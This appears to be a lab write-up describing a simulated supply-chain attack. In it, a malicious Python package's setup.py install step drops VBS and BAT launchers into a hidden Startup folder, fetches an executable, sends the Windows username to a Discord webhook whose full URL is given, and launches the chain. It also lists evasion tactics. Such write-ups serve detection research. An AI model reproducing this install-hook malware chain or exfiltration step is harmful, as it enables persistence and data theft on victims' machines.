## Attack Detail

- Prepare：

    - Download [pyenv-win](https://pyenv-win.github.io/pyenv-win/docs/installation.html#pyenv-win-zip)
    
    - Configure python version with 3.10:
        ```
            pyenv install 3.10
            pyenv global 3.10
        ```
    
    - Simulated normal behaviour for daily operation (increase noise) 

        - Windows Dev Host (download python package):
            
            - Pre-installed Software
                - vs code, filezilla, pip, python, git, MobaXterm, discord, 1password
            
            - Simulated Behaviours
                - 2, 3, 4, 5, 6, 7, 8, 9


    - Configure discord Webhook
        
        - create a server managed by yourself (have permission to manage this channel)

        - Right-click a channel (text channel).

        - Select Integrations.

        - Click Webhooks.

        - Click New Webhook and copy the created link
    
    - Web Service to host exectuable file
        ```
        python3 app.py
        
        ```

        the following script will access http://127.0.0.1:8081/dl/runtime to download the executable file


- Exploitation

    - payload execution

        ```
            python3 setup.py install # under pystallerer-1.0.0

        ```

        The involving actions:

        - identify the current Windows user

        - prepare a hidden "System64" directory

        - Drop VBS file (first stage)
        
        - Drop BAT launcher files

        - Persistence via Startup folder
        
            Downloads a potential malware (Runtime.exe) from an external server.

            Uses Windows Startup Folder to achieve persistence, ensuring the malware runs after every reboot.
        
            Avoids detection by placing files in Windows system directories.

        - Download additional payloads from a remote server

            Use tools like curl (and/or Windows transfer tools) to download executables:

            From a hard-coded IP / URL

            Store them in the System64 directory mentioned above.

        - Send data to Discord Webhook

            There’s a snippet that constructs a JSON string with the username:
            ```
            aha = '{"\\"username\\": \\"test\\", \\"content\\":\\"' + login + '\\"}"'

            ```

            And then uses curl to POST this JSON to a Discord webhook like (for test purpose):
            ```
            https://discord.com/api/webhooks/1447601137313124445/jS8bDgq2s_Zs40hFB7OxjBkQPfekaml_65i3pt2az_1xUkpnpEN9RiJr1Y7fWi8Eeqsr
            ```

        - Finally, execute the dropped VBS

            ```
            subprocess.run(
                f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.vbs",
                shell=True,
                check=True
            )
            ```
            Which kicks off the VBS → BAT → EXE execution chain.


- Trigger

    under executing setup.py --- automatically trigger the download and execution of payload

- Evasion Method

    - sophisticated encryption method
    - file replacement
    - earse trace

- Attack Timeline



